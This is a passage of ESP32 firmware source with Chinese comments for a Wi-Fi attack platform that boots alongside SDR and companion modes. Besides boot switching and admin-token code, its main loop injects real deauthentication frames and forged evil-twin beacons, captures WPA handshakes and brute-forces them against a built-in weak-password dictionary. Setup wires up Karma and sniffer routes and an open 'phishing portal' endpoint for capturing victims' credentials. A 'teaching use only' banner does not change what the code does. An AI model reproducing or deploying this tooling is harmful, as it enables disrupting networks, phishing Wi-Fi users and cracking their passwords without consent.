  for (int i = 0; i < 12; i++) t += TOKEN_ALPHABET[esp_random() % (sizeof(TOKEN_ALPHABET) - 1)];
  return t;
}

static void handleGetConfig() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
  String json = "{";
  json += "\"channel\":" + String(apChannel) + ",";
  json += "\"ssid\":\"" + jsonEscape(apSsid) + "\"";
  json += "}";
  server.send(200, "application/json", json);
}

/* ---------------- 多系统引导管理 (Triple-Boot) ----------------
 * 支持在 16MB Flash (如 ESP32-C5N16R8) 或多 OTA 分区环境下无缝切换系统:
 *   1. audit   : Wi-Fi 安全审计平台 (当前固件, 默认 ota_0 或 factory)
 *   2. espsoup : ESPsoup 口袋 SDR 模式 (ota_1)
 *   3. muse    : Meta Muse AI 伴侣模式 (ota_2)
 */

struct SystemSlot {
  const char *id;
  const char *name;
  const char *desc;
  esp_partition_subtype_t subtype;
  const char *label;
};

static const SystemSlot SYSTEM_SLOTS[] = {
  { "audit",   "Wi-Fi 安全审计平台",     "AP热点、Web管理后台、混杂抓包、Evil Twin、Deauth", ESP_PARTITION_SUBTYPE_APP_OTA_0, "ota_0" },
  { "espsoup", "ESPsoup 口袋 SDR 模式",  "2.4G~5.9G 瀑布图、FPV 模拟图传、AirTag/DroneID 感知", ESP_PARTITION_SUBTYPE_APP_OTA_1, "ota_1" },
  { "muse",    "Meta Muse AI 伴侣模式",   "Wi-Fi 6 联网、BLE 配对、Meta Muse 语音与智能网关",   ESP_PARTITION_SUBTYPE_APP_OTA_2, "ota_2" }
};
static const size_t SYSTEM_SLOTS_COUNT = sizeof(SYSTEM_SLOTS) / sizeof(SYSTEM_SLOTS[0]);

static const esp_partition_t *findSystemPartition(const SystemSlot &slot) {
  const esp_partition_t *p = esp_partition_find_first(ESP_PARTITION_TYPE_APP, slot.subtype, NULL);
  if (!p && slot.label) {
    p = esp_partition_find_first(ESP_PARTITION_TYPE_APP, ESP_PARTITION_SUBTYPE_ANY, slot.label);
  }
  if (!p && slot.id) {
    p = esp_partition_find_first(ESP_PARTITION_TYPE_APP, ESP_PARTITION_SUBTYPE_ANY, slot.id);
  }
  if (!p && strcmp(slot.id, "audit") == 0) {
    p = esp_partition_find_first(ESP_PARTITION_TYPE_APP, ESP_PARTITION_SUBTYPE_APP_FACTORY, NULL);
  }
  return p;
}

static bool isSlotInstalled(const esp_partition_t *part) {
  if (!part) return false;
  uint8_t magic = 0;
  esp_err_t err = esp_partition_read(part, 0, &magic, 1);
  return (err == ESP_OK && magic == 0xE9);
}

static String getRunningSystemId() {
  const esp_partition_t *running = esp_ota_get_running_partition();
  if (!running) return "audit";
  for (size_t i = 0; i < SYSTEM_SLOTS_COUNT; i++) {
    const esp_partition_t *p = findSystemPartition(SYSTEM_SLOTS[i]);
    if (p && p->address == running->address) {
      return SYSTEM_SLOTS[i].id;
    }
  }
  if (running->subtype == ESP_PARTITION_SUBTYPE_APP_FACTORY ||
      running->subtype == ESP_PARTITION_SUBTYPE_APP_OTA_0) {
    return "audit";
  }
  if (running->subtype == ESP_PARTITION_SUBTYPE_APP_OTA_1) return "espsoup";
  if (running->subtype == ESP_PARTITION_SUBTYPE_APP_OTA_2) return "muse";
  return "audit";
}

static bool switchBootSystem(const String &targetId, String &errOut) {
  const SystemSlot *targetSlot = nullptr;
  for (size_t i = 0; i < SYSTEM_SLOTS_COUNT; i++) {
    if (targetId.equalsIgnoreCase(SYSTEM_SLOTS[i].id)) {
      targetSlot = &SYSTEM_SLOTS[i];
      break;
    }
  }
  if (!targetSlot) {
    errOut = "未知系统目标: " + targetId + " (可选: audit / espsoup / muse)";
    return false;
  }
  const esp_partition_t *targetPart = findSystemPartition(*targetSlot);
  if (!targetPart) {
    errOut = String("未找到 [") + targetSlot->name + "] 对应的 Flash 分区 (需 16MB 多系统分区表)";
    return false;
  }
  const esp_partition_t *running = esp_ota_get_running_partition();
  if (running && running->address == targetPart->address) {
    errOut = String("当前正在运行 [") + targetSlot->name + "]";
    return true;
  }
  if (!isSlotInstalled(targetPart)) {
    errOut = String("[") + targetSlot->name + "] 分区尚未烧录有效固件 (需在烧录台刷入 " + targetPart->label + ")";
    return false;
  }
  esp_err_t err = esp_ota_set_boot_partition(targetPart);
  if (err != ESP_OK) {
    errOut = "设置启动引导分区失败: " + String(esp_err_to_name(err));
    return false;
  }
  return true;
}

static void handleBootGet() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
  String runningId = getRunningSystemId();
  const esp_partition_t *runningPart = esp_ota_get_running_partition();

  String json = "{";
  json += "\"ok\":true,";
  json += "\"current\":\"" + runningId + "\",";
  json += "\"runningPartition\":\"" + String(runningPart ? runningPart->label : "default") + "\",";
  json += "\"multiBootSupported\":" + String(
    (findSystemPartition(SYSTEM_SLOTS[1]) != nullptr || findSystemPartition(SYSTEM_SLOTS[2]) != nullptr) ? "true" : "false"
  ) + ",";
  json += "\"systems\":[";
  for (size_t i = 0; i < SYSTEM_SLOTS_COUNT; i++) {
    const SystemSlot &slot = SYSTEM_SLOTS[i];
    const esp_partition_t *p = findSystemPartition(slot);
    bool installed = isSlotInstalled(p);
    bool active = (runningId == slot.id);

    if (i > 0) json += ",";
    json += "{";
    json += "\"id\":\"" + String(slot.id) + "\",";
    json += "\"name\":\"" + String(slot.name) + "\",";
    json += "\"desc\":\"" + String(slot.desc) + "\",";
    json += "\"partition\":\"" + String(p ? p->label : slot.label) + "\",";
    json += "\"active\":" + String(active ? "true" : "false") + ",";
    json += "\"installed\":" + String(installed ? "true" : "false") + ",";
    json += "\"address\":\"0x" + String(p ? p->address : 0, HEX) + "\",";
    json += "\"size\":\"" + String(p ? (p->size / 1024) : 0) + "KB\"";
    json += "}";
  }
  json += "]}";
  server.send(200, "application/json", json);
}

static void handleBootPost() {
  if (!server.hasArg("plain")) {
    server.send(400, "application/json", "{\"ok\":false,\"error\":\"missing body\"}");
    return;
  }
  String body = server.arg("plain");
  String target = extractJson(body, "target");
  if (!target.length()) {
    server.send(400, "application/json", "{\"ok\":false,\"error\":\"缺少 target 参数\"}");
    return;
  }
  String err;
  if (!switchBootSystem(target, err)) {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(400, "application/json", "{\"ok\":false,\"error\":\"" + jsonEscape(err) + "\"}");
    return;
  }
  log("[boot] 已切换启动分区至 [" + target + "], 设备将在 1 秒后重启 …");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true,\"target\":\"" + target + "\",\"message\":\"切换成功，设备即将重启\"}");
  delay(1000);
  ESP.restart();
}

static String sSerialCmd = "";
static void handleSerialCli() {
  while (Serial.available()) {
    char c = (char)Serial.read();
    if (c == '\r' || c == '\n') {
      sSerialCmd.trim();
      if (sSerialCmd.length() > 0) {
        String cmd = sSerialCmd;
        sSerialCmd = "";
        if (cmd == "help" || cmd == "?") {
          Serial.println(F("\n=== 可用串口命令 ==="));
          Serial.println(F("boot               : 查看当前系统与多系统引导槽位"));
          Serial.println(F("boot audit         : 切换至 Wi-Fi 安全审计平台并重启"));
          Serial.println(F("boot espsoup       : 切换至 ESPsoup 口袋 SDR 模式并重启"));
          Serial.println(F("boot muse          : 切换至 Meta Muse AI 伴侣模式并重启"));
          Serial.println(F("reboot             : 重启当前系统"));
          Serial.println(F("info               : 查看系统运行状态"));
          Serial.println(F("====================\n"));
        } else if (cmd == "boot" || cmd == "boot status") {
          Serial.println(F("\n=== 多系统引导槽位 (Triple-Boot) ==="));
          String cur = getRunningSystemId();
          Serial.println("当前运行: [" + cur + "]");
          for (size_t i = 0; i < SYSTEM_SLOTS_COUNT; i++) {
            const SystemSlot &slot = SYSTEM_SLOTS[i];
            const esp_partition_t *p = findSystemPartition(slot);
            bool inst = isSlotInstalled(p);
            Serial.printf(" - %-8s : %s | 分区:%s (0x%06X) | 状态:%s %s\n",
                          slot.id, slot.name,
                          p ? p->label : "未定义",
                          (unsigned int)(p ? p->address : 0),
                          (cur == slot.id) ? "[活跃运行中]" : (inst ? "[已就绪]" : "[未安装/未刷入]"),
                          (cur == slot.id) ? "◀" : "");
          }
          Serial.println(F("===================================\n"));
        } else if (cmd.startsWith("boot ")) {
          String tgt = cmd.substring(5);
          tgt.trim();
          String err;
          if (switchBootSystem(tgt, err)) {
            Serial.println("[boot] 切换成功: 引导目标设为 [" + tgt + "], 正在重启 …");
            delay(500);
            ESP.restart();
          } else {
            Serial.println("[boot] 切换失败: " + err);
          }
        } else if (cmd == "reboot") {
          Serial.println(F("[system] 正在重启 …"));
          delay(500);
          ESP.restart();
        } else if (cmd == "info") {
          Serial.printf("[system] 芯片:%s FreeHeap:%d Uptime:%lus SSID:%s\n",
                        detectChipKey().c_str(), ESP.getFreeHeap(), millis() / 1000, apSsid.c_str());
        }
      }
    } else if (c >= 32 && c <= 126) {
      if (sSerialCmd.length() < 64) sSerialCmd += c;
    }
  }
}


static void handleConfig() {
  if (!server.hasArg("plain")) {
    server.send(400, "application/json", "{\"error\":\"missing body\"}");
    return;
  }
  String body = server.arg("plain");
  String chStr = extractJson(body, "channel");
  bool changed = false;
  if (chStr.length()) {
    int ch = chStr.toInt();
    if (ch >= 1 && ch <= 13) {
      apChannel = (uint8_t)ch;
      sPrefs.putUChar("channel", apChannel);
      changed = true;
      log("[config] 已更新热点信道配置为 " + String(apChannel) + " (将在重启后生效)");
    }
  }
  String ssidStr = extractJson(body, "ssid");
  if (ssidStr.length() > 0 && ssidStr.length() <= 32) {
    apSsid = ssidStr;
    sPrefs.putString("ssid", apSsid);
    changed = true;
    log("[config] 已更新热点 SSID 为 " + apSsid + " (将在重启后生效)");
  }
  String tokStr = extractJson(body, "adminToken");
  if (tokStr.length() >= 4 && tokStr.length() <= 32) {
    sAdminToken = tokStr;
    sPrefs.putString("adminToken", sAdminToken);
    sPrefs.putBool("tokenChanged", true);
    sMustChangeToken = false;
    changed = true;
    log("[config] 后台访问口令已更新 (立即生效)");
  }
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true,\"changed\":" + String(changed ? "true" : "false") +
              ",\"channel\":" + String(apChannel) + ",\"ssid\":\"" + jsonEscape(apSsid) + "\"}");
}

static void doFactoryReset() {
  log("[admin] 恢复出厂设置 (擦除 NVS 配置) …");
  sPrefs.clear();
  nvs_flash_erase();
  nvs_flash_init();
  server.send(200, "application/json", "{\"ok\":true}");
  delay(1000);
  ESP.restart();
}

static void doReset() {
  log("[admin] 收到重启指令, 1 秒后重启 …");
  server.send(200, "application/json", "{\"ok\":true}");
  delay(1000);
  ESP.restart();
}

static void redirectToAdmin() {
  server.sendHeader("Location", ADMIN_HTML_C);
  server.send(302, "text/plain", "");
}

/* ---------------- 后台简易鉴权 ----------------
 * 所有 /api/ 管理接口均需携带 X-Admin-Token 请求头 (或 ?token= 查询参数)。
 * admin.html 只含登录壳与界面代码, 真正的数据边界在 API;
 * 钓鱼门户 /api/portal/submit 保持开放 (凭据捕获流程所需)。
 */
// 常量时间比较: 长度不提前返回, 避免通过响应耗时推测口令长度或前缀
static bool tokenEquals(const String &a, const String &b) {
  size_t n = (a.length() > b.length()) ? a.length() : b.length();
  uint8_t diff = (uint8_t)(a.length() ^ b.length());
  for (size_t i = 0; i < n; i++) {
    uint8_t x = (i < a.length()) ? (uint8_t)a[i] : 0;
    uint8_t y = (i < b.length()) ? (uint8_t)b[i] : 0;
    diff |= (uint8_t)(x ^ y);
  }
  return diff == 0;
}

static bool adminAuthorized() {
  String t = server.header("X-Admin-Token");
  if (t.length() == 0) t = server.arg("token");
  return t.length() > 0 && tokenEquals(t, sAdminToken);
}

static bool requireAdmin() {
  if (adminAuthorized()) return true;
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(401, "application/json", "{\"error\":\"unauthorized: 缺少或错误的后台口令\"}");
  return false;
}

// 仅注册需要鉴权的路由: 401 时直接返回, 不执行业务 handler
static void onAdmin(const char *uri, HTTPMethod method, void (*fn)()) {
  server.on(uri, method, [fn]() {
    if (requireAdmin()) fn();
  });
}

static void captiveRedirect(const char *type = "text/plain") {
  // 当开启邪恶双子实验时，优先弹出钓鱼验证门户；否则弹出后台管理 (CNA 要求绝对 URI)
  const char *loc = sEvilTwin.active ? "http://192.168.4.1/portal.html" : ADMIN_HTML_C;
  server.sendHeader("Location", loc);
  server.send(302, type, "");
}

static void notFound() {
  if (server.method() == HTTP_OPTIONS) {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.sendHeader("Access-Control-Allow-Methods", "GET,POST,DELETE,OPTIONS");
    server.sendHeader("Access-Control-Allow-Headers", "Content-Type, X-Admin-Token");
    server.send(204);
    return;
  }
  String uri = server.uri();
  if (uri.startsWith("/api/")) {
    server.send(404, "text/plain", "404 — 未知 API: " + uri);
    return;
  }
  if (uri == "/hotspot-detect.html" || uri == "/library/test/success.html" ||
      uri == "/generate_204" || uri == "/gen_204" ||
      uri == "/connecttest.txt" || uri == "/redirect" || uri == "/ncsi.txt" ||
      uri == "/success.txt" || uri == "/fwlink" || uri == "/") {
    captiveRedirect();
    return;
  }
  captiveRedirect();
}

void setup() {
  Serial.begin(115200);
  delay(200);
  Serial.println();
  Serial.println("==============================================");
  Serial.println(F("ESP32 无线网络开发固件 v" FW_VERSION " (" FW_BUILD_NS ")"));
  Serial.println(F("无线安全教学与协议验证 · 严禁非法使用"));
  Serial.println("==============================================");

  WiFi.persistent(false);
  WiFi.mode(WIFI_AP_STA);

  sPrefs.begin("esp32-cfg", false);
  apChannel = sPrefs.getUChar("channel", AP_CHANNEL_DEFAULT);
  if (apChannel < 1 || apChannel > 13) apChannel = AP_CHANNEL_DEFAULT;
  sAdminToken = sPrefs.getString("adminToken", "");   // 空串 = 尚未初始化, 待 RF 开启后生成随机口令

  uint8_t apMac[6];
  WiFi.softAPmacAddress(apMac);
  String defaultSsid = "WiFi-" + formatMac(apMac).substring(12);
  defaultSsid.replace(":", "");

  String savedSsid = sPrefs.getString("ssid", "");
  apSsid = (savedSsid.length() > 0) ? savedSsid : defaultSsid;

  if (!WiFi.softAP(apSsid.c_str(), AP_PASSWORD, apChannel, false, 4)) {
    log("[wifi] softAP 启动失败, 将重试 …");
    delay(2000);
    WiFi.softAP(apSsid.c_str(), AP_PASSWORD, apChannel, false, 4);
  }
  apChannelActive = apChannel;  // 记录开机实际信道 (后续攻击可临时切换, 配置值不变)
  log("[wifi] AP 已启动: SSID=" + apSsid + "  密码=" + AP_PASSWORD + "  信道=" + String(apChannel));
  log("[wifi] 后台: " + String(ADMIN_HTML_C));
  log("[system] 芯片: " + detectChipKey() + "  FreeHeap: " + String(ESP.getFreeHeap()) + " bytes");
  // 首次上电 / 恢复出厂 / 从旧版静态口令升级 → 轮换为设备唯一随机口令。
  // 只经 Serial 直出一次: 不走 log(), 因此不进入 NDJSON 遥测、不进入 /api/log 日志缓冲。
  if (sAdminToken.length() < 4 || sAdminToken == LEGACY_DEFAULT_TOKEN) {
    sAdminToken = makeRandomAdminToken();   // 此时 RF 已启动, esp_random() 熵充足
    sPrefs.putString("adminToken", sAdminToken);
    sPrefs.putBool("tokenChanged", false);
    Serial.println(F("[admin] ===== 首次上电: 后台初始口令 (仅显示这一次) ====="));
    Serial.println("[admin]   " + sAdminToken);
    Serial.println(F("[admin] 请登录后立即在「配置」页修改并妥善保存; 恢复出厂会重新生成"));
  }
  sMustChangeToken = !sPrefs.getBool("tokenChanged", false);
  log("[admin] 后台口令保护已启用" +
      String(sMustChangeToken ? " (初始口令, 请尽快在「配置」页修改)" : " (自定义口令)"));

  // 上电遥测: 设备身份 (只读)
  emitJson("boot",
           "\"chip\":\"" + jsonEscape(detectChipKey()) +
           "\",\"fw\":\"" FW_VERSION +
           "\",\"ssid\":\"" + jsonEscape(apSsid) +
           "\",\"mac\":\"" + formatMac(apMac) +
           "\",\"channel\":" + String(apChannel));

  // 后台口令保护: 每台设备的初始口令由硬件 TRNG 生成并存 NVS, 首次登录引导改密
  static const char *adminHeaders[] = {"X-Admin-Token", "Content-Type"};
  server.collectHeaders(adminHeaders, 2);

  server.on("/", HTTP_GET, redirectToAdmin);
  server.on("/admin.html", HTTP_GET, sendAdminPage);
  server.on("/portal.html", HTTP_GET, sendPortalPage);
  server.on("/api/portal/submit", HTTP_POST, handlePortalSubmit);
  onAdmin("/api/info", HTTP_GET, sendInfo);
  onAdmin("/api/scan", HTTP_GET, handleScan);
  onAdmin("/api/target", HTTP_POST, handleTarget);
  onAdmin("/api/twin", HTTP_POST, handleTwinAdd);
  onAdmin("/api/twin", HTTP_DELETE, handleTwinRemove);
  onAdmin("/api/config", HTTP_GET, handleGetConfig);
  onAdmin("/api/config", HTTP_POST, handleConfig);
  
  // 3 大教学验证板块路由
  onAdmin("/api/eviltwin/start", HTTP_POST, handleEvilTwinStart);
  onAdmin("/api/eviltwin/stop", HTTP_POST, handleEvilTwinStop);
  onAdmin("/api/eviltwin/creds", HTTP_GET, handleEvilTwinCreds);
  onAdmin("/api/eviltwin/creds", HTTP_DELETE, handleEvilTwinClearCreds);
  
  onAdmin("/api/deauth/start", HTTP_POST, handleDeauthStart);
  onAdmin("/api/deauth/stop", HTTP_POST, handleDeauthStop);
  onAdmin("/api/deauth/status", HTTP_GET, handleDeauthStatus);

  onAdmin("/api/handshake/start", HTTP_POST, handleHandshakeStart);
  onAdmin("/api/handshake/stop", HTTP_POST, handleHandshakeStop);
  onAdmin("/api/handshake/crack", HTTP_POST, handleHandshakeCrack);
  onAdmin("/api/handshake/dump", HTTP_GET, handleHandshakeDump);

  // 数据包分析器、Airodump侦察与 Karma 攻击路由
  onAdmin("/api/sniffer/start", HTTP_POST, handleSnifferStart);
  onAdmin("/api/sniffer/stop", HTTP_POST, handleSnifferStop);
  onAdmin("/api/sniffer/status", HTTP_GET, handleSnifferStatus);

  onAdmin("/api/airodump/start", HTTP_POST, handleAirodumpStart);
  onAdmin("/api/airodump/stop", HTTP_POST, handleAirodumpStop);
  onAdmin("/api/airodump/status", HTTP_GET, handleAirodumpStatus);

  onAdmin("/api/karma/start", HTTP_POST, handleKarmaStart);
  onAdmin("/api/karma/stop", HTTP_POST, handleKarmaStop);
  onAdmin("/api/karma/status", HTTP_GET, handleKarmaStatus);
  // 跑包统一走 /api/handshake/crack, 不再保留 /api/karma/crack 别名

  onAdmin("/api/log", HTTP_GET, handleLog);
  onAdmin("/api/system/boot", HTTP_GET, handleBootGet);
  onAdmin("/api/system/boot", HTTP_POST, handleBootPost);
  onAdmin("/api/reset", HTTP_POST, doReset);
  onAdmin("/api/factory-reset", HTTP_POST, doFactoryReset);
  server.onNotFound(notFound);
  server.begin();
  log("[http] 管理后台 HTTP 服务已启动 (80)");

  if (dnsServer.start(DNS_PORT, "*", WiFi.softAPIP())) {
    log("[dns] Captive Portal DNS 已启动 (53, * → 192.168.4.1)");
  } else {
    log("[dns] Captive Portal DNS 启动失败 (后台仍可用, 需手动输地址)");
  }
}

void loop() {
  handleSerialCli();
  server.handleClient();
  dnsServer.processNextRequest();

  uint32_t now = millis();

  // 1. 取消认证器定时帧注入推进 (真实 802.11 Deauth 管理帧, 经 AP 接口空口发出)
  //    邪恶双子攻击中: 每 TWIN_HOP_INTERVAL_MS 跳频到双子信道连发 TWIN_HOP_FRAMES 帧再返回,
  //    主信道注入在跳频窗口内暂停 (单射频, 同一时刻只能停在一个信道上发帧)。
  if (sDeauth.running) {
    bool inHopWindow = false;
    if (sEvilTwin.active && sEvilTwin.hopEnabled && !sEvilTwin.caught) {
      if (sEvilTwin.hopping) {
        inHopWindow = true;
      } else if (now - sEvilTwin.lastHopAt >= TWIN_HOP_INTERVAL_MS) {
        sEvilTwin.lastHopAt = now;
        if (!eviltwinBeginHop()) {
          // 全部双子信道都切不过去 (频段不支持等): 关闭跳频, 避免每 2s 反复试错刷日志
          sEvilTwin.hopEnabled = false;
          log("[eviltwin] 双子目标信道均切换失败, 已停用双子注入");
        }
      }
    }
    if (inHopWindow) {
      if (now - sDeauth.lastTxTime >= TWIN_HOP_TX_GAP_MS) {
        sDeauth.lastTxTime = now;
        // 先发伪造信标 (假 AP), 再发 Deauth
        if (sEvilTwin.beaconLeft > 0 && sEvilTwin.beaconLen > 0) {
          if (esp_wifi_80211_tx(WIFI_IF_AP, sEvilTwin.beaconFrame, (int)sEvilTwin.beaconLen, true) == ESP_OK)
            sEvilTwin.beaconCount++;
          sEvilTwin.beaconLeft--;
        } else if (sEvilTwin.twinFramesLeft > 0) {
          if (sEvilTwin.twinFrameReady &&
              esp_wifi_80211_tx(WIFI_IF_AP, sEvilTwin.twinFrame, (int)sizeof(sEvilTwin.twinFrame), true) == ESP_OK) {
            sDeauth.frameCount++;
            sEvilTwin.twinFrameCount++;
          }
          sEvilTwin.twinFramesLeft--;
        }
        if (sEvilTwin.beaconLeft == 0 && sEvilTwin.twinFramesLeft == 0) {
          applyApChannel(sDeauth.targetChannel);   // 返回主信道, 恢复主目标持续攻击
          sEvilTwin.hopping = false;
          sEvilTwin.hopCurrent = -1;
        }
      }
    } else {
      if (now - sDeauth.lastTxTime >= sDeauth.rateLimitMs) {
        sDeauth.lastTxTime = now;
        if (sDeauth.frameReady) {
          sDeauth.lastTxErr = esp_wifi_80211_tx(WIFI_IF_AP, sDeauth.frame, (int)sizeof(sDeauth.frame), true);
          sDeauth.txOk = (sDeauth.lastTxErr == ESP_OK);
          if (sDeauth.txOk) sDeauth.frameCount++;
        }
      }
    }
    if (now - sDeauth.lastLogTime >= 5000) {
      sDeauth.lastLogTime = now;
      log("[deauth] 正在对目标进行解除认证测试, 已成功发送 " + String(sDeauth.frameCount) + " 帧" +
          (sEvilTwin.twinFrameCount ? (" (其中双子信道 " + String(sEvilTwin.twinFrameCount) + " 帧)") : "") +
          (sDeauth.txOk || !sDeauth.frameReady ? "" : (" (最近 TX 错误码 " + String(sDeauth.lastTxErr) + ")")));
    }
  }

  // 2. 握手包捕获进度日志 (真实抓包: 帧由 promiscuous 回调写入状态)
  if (sHandshake.capturing) {
    if (sHandshake.m1 && !sHsLoggedM1) {
      sHsLoggedM1 = true;
      log("[eapol] 捕获 M1: ANonce (AP -> STA)");
    }
    if (sHandshake.m2 && !sHsLoggedM2) {
      sHsLoggedM2 = true;
      log("[eapol] 捕获 M2: SNonce + MIC (STA -> AP)");
    }
    if (sHandshake.captured && !sHsLoggedDone) {
      sHsLoggedDone = true;
      log(String("[eapol] 握手包完整! keyver=") + String(sHandshake.keyver) +
          (sHandshake.pmkid ? " 含 PMKID" : "") +
          (sHandshake.unsupported ? " (PMF, 需交服务端跑包)" : " 可开始跑包"));
    }
  }

  // 3. 弱口令跑包: 每轮主循环只试一条, 保持 HTTP 响应 (单条约 10~30ms PBKDF2)
  if (sHandshake.cracking) {
    if (sHandshake.crackProgress < sHandshake.crackTotal) {
      const char *cand = WIFI_WEAK_DICT[sHandshake.crackProgress];
      uint8_t mic[16];
      sHandshake.crackAttempts++;
      if (computeM2Mic(cand, mic) && memcmp(mic, sHandshake.eapol + 81, 16) == 0) {
        sHandshake.crackedPass = cand;
        sHandshake.cracking = false;
        uint32_t secs = (now - sHandshake.crackStartTime) / 1000;
        log("[crack] 🎉 命中弱口令: " + String(cand) + " (字典第 " + String(sHandshake.crackProgress + 1) +
            " 条, 耗时 " + String(secs) + "s)");
      } else {
        sHandshake.crackProgress++;
        if (sHandshake.crackProgress >= sHandshake.crackTotal) {
          sHandshake.cracking = false;
          log("[crack] 字典跑包完毕, 未匹配到弱口令 (该口令不在内置字典内)");
        } else if ((sHandshake.crackProgress % 500) == 0) {
          log("[crack] 进度 " + String(sHandshake.crackProgress) + "/" + String(sHandshake.crackTotal));
        }
      }
    } else {
      sHandshake.cracking = false;
    }
  }

  // 4. 数据包分析器: 真实帧由 promiscuous 回调写入, 这里只做信道跳频与 fps 统计
  if (sSniffer.running) {
    // 单射频: 与握手/Deauth/邪恶双子冲突时停驻当前信道, 避免破坏正在进行的捕获或注入
    if (sSniffer.hopping && !sHandshake.capturing && !sDeauth.running && !sEvilTwin.active &&
        now - sSniffer.lastHopTime >= 400) {
      sSniffer.lastHopTime = now;
      uint8_t next = nextHopChannel(sSniffer.channel, sSniffer.skipDfs);
      if (applyApChannel(next)) sSniffer.channel = next;
    }
    if (now - sSniffer.lastFpsCalc >= 1000) {
      sSniffer.fps = sSniffer.fpsAccum;
      sSniffer.fpsAccum = 0;
      sSniffer.lastFpsCalc = now;
    }
  }

  // 5. Airodump: 对端聚合由 promiscuous 回调写入, 这里只做信道跳频
  if (sAirodump.running) {
    if (sAirodump.hopping && !sHandshake.capturing && !sDeauth.running && !sEvilTwin.active &&
        now - sAirodump.lastHopTime >= 700) {
      sAirodump.lastHopTime = now;
      uint8_t next = nextHopChannel(sAirodump.currentChannel, sAirodump.skipDfs);
      if (applyApChannel(next)) sAirodump.currentChannel = next;
    }
  }

  // 6. Karma: Probe Request 由 promiscuous 回调实时记录, 无需定时器

  // 客户端上下线遥测: 由 softAP 客户端数变化推导 (只读计数)
  static uint8_t lastClients = 0;
  uint8_t clients = WiFi.softAPgetStationNum();
  if (clients > lastClients) {
    emitJson("client_join", "\"clients\":" + String(clients));
  } else if (clients < lastClients) {
    emitJson("client_leave", "\"clients\":" + String(clients));
  }
  lastClients = clients;

  // 心跳: 每 30 秒打印状态 (文本日志 + 结构化遥测各一份)
  static uint32_t lastBeat = 0;
  if (now - lastBeat > 30000) {
    lastBeat = now;
    log("[beacon] " + apSsid + " clients=" + String(clients)
        + "  heap=" + String(ESP.getFreeHeap()) + "  uptime=" + String(now / 1000) + "s");
    emitJson("heartbeat",
             "\"clients\":" + String(clients) +
             ",\"heap\":" + String(ESP.getFreeHeap()) +
             ",\"uptime\":" + String(now / 1000) +
             ",\"minFree\":" + String(ESP.getMinFreeHeap()) +
             ",\"ssid\":\"" + jsonEscape(apSsid) + "\"");
  }
  delay(2);
}
